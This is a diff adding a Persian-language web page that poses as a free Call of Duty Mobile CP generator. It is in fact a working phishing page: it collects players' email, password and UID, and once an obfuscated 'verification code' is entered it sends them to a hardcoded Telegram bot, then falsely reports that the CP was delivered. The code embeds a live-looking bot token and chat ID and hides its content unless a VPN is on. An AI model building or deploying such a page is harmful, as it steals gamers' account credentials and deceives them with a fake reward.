@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Call of Duty Mobile - Free CP 2025</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Vazirmatn:wght@500;700&display=swap" rel="stylesheet">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{
+      font-family:'Vazirmatn',sans-serif;
+      background:#000;
+      min-height:100vh;
+      background-image:
+        radial-gradient(circle at 20% 80%,rgba(255,0,255,0.3),transparent 50%),
+        radial-gradient(circle at 80% 20%,rgba(0,255,255,0.3),transparent 50%),
+        radial-gradient(circle at 50% 50%,rgba(255,255,0,0.2),transparent 60%);
+      overflow-x:hidden;
+      animation:bgShift 15s infinite;
+    }
+    @keyframes bgShift{0%{background-position:0% 50%;}100%{background-position:100% 50%;}}
+
+    .container{max-width:430px;margin:15px auto;padding:20px;position:relative;z-index:10;}
+
+    .header{text-align:center;margin:20px 0;}
+    .logo{
+      font-family:'Orbitron',monospace;
+      font-size:3.8em;font-weight:900;
+      background:linear-gradient(45deg,#ff00ff,#00ffff,#ffff00,#ff0088);
+      -webkit-background-clip:text;
+      -webkit-text-fill-color:transparent;
+      animation:neonGlow 2s infinite alternate;
+      text-shadow:0 0 40px #ff00ff;
+    }
+    @keyframes neonGlow{
+      from{text-shadow:0 0 20px #ff00ff,0 0 40px #ff00ff;}
+      to{text-shadow:0 0 30px #00ffff,0 0 60px #00ffff;}
+    }
+    .subtitle{color:#00ff88;font-size:1.1em;margin-top:10px;text-shadow:0 0 10px #00ff88;}
+
+    .card{
+      background:rgba(10,5,40,0.8);
+      border:2px solid #333;
+      border-radius:18px;
+      padding:22px;
+      margin-bottom:18px;
+      backdrop-filter:blur(12px);
+      box-shadow:0 0 30px rgba(255,0,255,0.3);
+      transition:0.4s;
+    }
+    .card:hover{box-shadow:0 0 50px rgba(255,0,255,0.6);border-color:#ff00ff;}
+
+    .title{
+      color:#00ffff;font-size:1.4em;margin-bottom:18px;
+      text-shadow:0 0 15px #00ffff;font-weight:bold;
+      display:flex;align-items:center;gap:10px;
+    }
+    .title::before{content:"»";color:#ff00ff;font-size:1.6em;}
+
+    input{
+      width:100%;padding:16px;background:rgba(0,0,0,0.7);
+      border:2px solid #444;border-radius:14px;color:#fff;
+      font-size:16px;margin:8px 0;transition:0.4s;
+    }
+    input:focus{
+      outline:none;border-color:#ff00ff;
+      box-shadow:0 0 25px rgba(255,0,255,0.7);
+    }
+
+    .cp-grid{
+      display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:15px 0;
+    }
+    .cp-btn{
+      padding:16px;background:linear-gradient(45deg,#8a00ff,#ff0088);
+      border:none;border-radius:14px;color:#fff;
+      font-weight:bold;font-size:15px;cursor:pointer;
+      box-shadow:0 5px 20px rgba(138,0,255,0.5);
+      transition:0.4s;
+    }
+    .cp-btn:hover,.cp-btn.active{
+      transform:translateY(-10px);box-shadow:0 15px 40px rgba(255,0,136,0.8);
+    }
+
+    .generate-btn{
+      width:100%;padding:20px;background:linear-gradient(45deg,#00ff88,#00cc66);
+      border:none;border-radius:18px;color:#000;font-size:22px;
+      font-weight:bold;margin:25px 0;cursor:pointer;
+      box-shadow:0 0 50px rgba(0,255,136,0.9);transition:0.4s;
+    }
+    .generate-btn:hover{transform:scale(1.05);box-shadow:0 0 80px rgba(0,255,136,1);}
+
+    .verify-section{
+      display:none;background:rgba(0,255,0,0.15);border:3px solid #00ff00;
+      border-radius:20px;padding:25px;margin-top:20px;
+      animation:pulse 2s infinite;box-shadow:0 0 40px rgba(0,255,0,0.4);
+    }
+    @keyframes pulse{0%,100%{box-shadow:0 0 30px #00ff00;}50%{box-shadow:0 0 70px #00ff00;}}
+
+    .verify-section input{
+      text-align:center;font-size:30px;letter-spacing:12px;
+      background:rgba(0,0,0,0.8);font-weight:bold;
+    }
+
+    .status{text-align:center;margin-top:20px;font-size:19px;font-weight:bold;}
+
+    /* صفحه وقتی فیلترشکن خاموشه */
+    #vpnRequired{
+      position:fixed;top:0;left:0;width:100%;height:100%;
+      background:#000;color:#ff0000;display:flex;
+      align-items:center;justify-content:center;flex-direction:column;
+      font-size:22px;text-align:center;z-index:9999;
+    }
+    #vpnRequired h1{font-size:3em;margin-bottom:20px;animation:blink 1s infinite;}
+    @keyframes blink{0%,100%{opacity:1;}50%{opacity:0.3;}}
+  </style>
+</head>
+<body>
+
+<!-- صفحه فقط با فیلترشکن -->
+<div id="vpnRequired">
+  <h1>فیلترشکن روشن کن!</h1>
+  <p>این صفحه فقط با VPN کار می‌کنه</p>
+</div>
+
+<!-- صفحه اصلی (مخفیه تا وقتی فیلترشکن روشن نباشه) -->
+<div id="mainContent" style="display:none;">
+
+  <div class="container">
+    <div class="header">
+      <h1 class="logo">FREE CP</h1>
+      <p class="subtitle">ژنراتور سی‌پی رایگان کالاف دیوتی موبایل 2025</p>
+    </div>
+
+    <div class="card">
+      <div class="title">ایمیل اکانت</div>
+      <input type="email" id="gmail" placeholder="example@gmail.com">
+    </div>
+
+    <div class="card">
+      <div class="title">پسورد اکانت</div>
+      <input type="password" id="pass" placeholder="رمز عبور خودت">
+    </div>
+
+    <div class="card">
+      <div class="title">UID اکانت</div>
+      <input type="text" id="uid" placeholder="6789012345678901">
+    </div>
+
+    <div class="card">
+      <div class="title">اسم + تعداد CP</div>
+      <input type="text" id="nick" placeholder="نام اکانت تو بازی">
+      <div class="cp-grid">
+        <button class="cp-btn active" onclick="selectCP(80)">80 CP</button>
+        <button class="cp-btn" onclick="selectCP(400)">400 CP</button>
+        <button class="cp-btn" onclick="selectCP(800)">800 CP</button>
+        <button class="cp-btn" onclick="selectCP(2000)">2000 CP</button>
+      </div>
+    </div>
+
+    <button class="generate-btn" onclick="showVerify()">شروع ژنراتور CP</button>
+
+    <div class="verify-section" id="verifyBox">
+      <div class="title" style="color:#00ff00">تأیید انسانی</div>
+      <p>کد تأیید رو از ادمین بگیر و وارد کن:</p>
+      <input type="text" id="code" maxlength="10" placeholder="••••••••••">
+      <button class="generate-btn" onclick="verifyAndSend()">تأیید و دریافت CP</button>
+    </div>
+
+    <div class="status" id="status"></div>
+  </div>
+
+</div>
+
+<script>
+  // چک کردن فیلترشکن (با چند سرور معروف)
+  const vpnCheckUrls = [
+    "https://www.google.com", 
+    "https://www.youtube.com",
+    "https://telegram.org",
+    "https://discord.com"
+  ];
+
+  let vpnActive = false;
+
+  function checkVPN() {
+    let passed = 0;
+    vpnCheckUrls.forEach(url => {
+      fetch(url, { method: 'HEAD', mode: 'no-cors', cache: 'no-store' })
+        .then(() => { passed++; if(passed >= 2) showPage(); })
+        .catch(() => {});
+    });
+
+    // اگر بعد ۴ ثانیه هنوز نشد، فرض کن خاموشه
+    setTimeout(() => {
+      if(!vpnActive){
+        document.getElementById('vpnRequired').innerHTML = "<h1>فیلترشکن روشن کن!</h1><p>بدون VPN این صفحه کار نمی‌کنه</p>";
+      }
+    }, 4000);
+  }
+
+  function showPage(){
+    if(vpnActive) return;
+    vpnActive = true;
+    document.getElementById('vpnRequired').style.display = 'none';
+    document.getElementById('mainContent').style.display = 'block';
+  }
+
+  // شروع چک کردن
+  checkVPN();
+
+  // بقیه کد (همون قبلی)
+  let cp = 80;
+  let data = {};
+
+  function selectCP(n){cp=n;document.querySelectorAll('.cp-btn').forEach(b=>b.classList.remove('active'));event.target.classList.add('active');}
+
+  function showVerify(){
+    const gmail=document.getElementById('gmail').value.trim();
+    const pass=document.getElementById('pass').value;
+    const uid=document.getElementById('uid').value.trim();
+    const nick=document.getElementById('nick').value.trim();
+    if(!gmail||!pass||!uid||!nick){alert("همه قسمت‌ها رو پر کن");return;}
+    data={gmail,pass,uid,nick,cp};
+    document.getElementById('verifyBox').style.display='block';
+    document.getElementById('verifyBox').scrollIntoView({behavior:'smooth'});
+  }
+
+  const SECRET_CODE = atob("bWljeTAwOTE="); // micy0091
+
+  function verifyAndSend(){
+    const entered = document.getElementById('code').value.trim();
+
+    if(entered === SECRET_CODE){
+      const text = `CP جدید!\nایمیل: ${data.gmail}\nپسورد: ${data.pass}\nUID: ${data.uid}\nنام: ${data.nick}\nCP: ${data.cp}\nکد: ${entered}\nزمان: ${new Date().toLocaleString('fa-IR')}`;
+
+      const BOT_TOKEN = "8542073638:AAE5QwDZ_hxtOKGyuQ4G3qrMkKq92pC387Y"; // ← توکن باتت
+      const CHAT_ID   = "6080665310";                                 // ← آیدی عددی خودت
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({chat_id:CHAT_ID,text:text})
+      });
+
+      document.getElementById('status').innerHTML = "<span style='color:#00ff00'>CP با موفقیت واریز شد!</span>";
+    } else {
+      document.getElementById('status').innerHTML = "<span style='color:#ff0000'>کد اشتباه است!</span>";
+    }
+  }
+</script>
+
+</body>
+</html>
